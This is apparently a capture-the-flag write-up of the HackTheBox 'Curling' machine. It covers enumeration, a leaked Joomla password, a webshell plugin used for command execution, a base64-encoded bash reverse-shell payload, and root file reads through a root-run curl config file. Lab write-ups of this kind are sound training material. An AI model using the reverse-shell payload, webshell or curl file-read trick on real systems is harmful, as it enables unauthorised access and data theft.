Started with a nmap scan
```
22 OpenSSH 7.6p1
80 Apache httpd 2.4.29
```
Going to the website it says its a cewl curling site which makes me think we need to use the program cewl to make a word list and there is a login forum going to start  a gobuster scan and see what else is on the host 
```
/images
/media
/templates
/modules
/index.php
/bin
/plugins
/includes
/README.txt
/components
/cache
/tmp
/LICENSE.txt
/secret.txt
/htaccess.txt
/administrator
/cli
```
Looking at he `htaccess.txt` its a joomla site running joomscan it shows its version `3.8.8` looking at the `secret.txt` it decodes to `Curling2018!` and using the name found on the main site `floris` we can now login into the superuser account using this plugin for joomla that allows us to exacute code https://github.com/p0dalirius/Joomla-webshell-plugin and then going to this link http://10.10.10.150/modules/mod_webshell/mod_webshell.php?action=exec&cmd=id we can now exacute code as `www-data` now to get a reverse shell I made a `rev.sh` file with this payload `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4.........Q== | base64 -d | bash` and now got a reverse shell looking at he webapp source code found the creds for mysql database `floris:.......................` looking in the home folder of `floris` we can read a file called `password_backup` and its a hexdump we can take this to cyberchef and we get the password for the user account `...............` ran linpeas did not see much so I ran pspy64 and found that root is curling this file `/home/floris/admin-area/input` and we can edit the file so if we add this to the file `file:///root/root.txt` and we will get the root flag or any file you want as root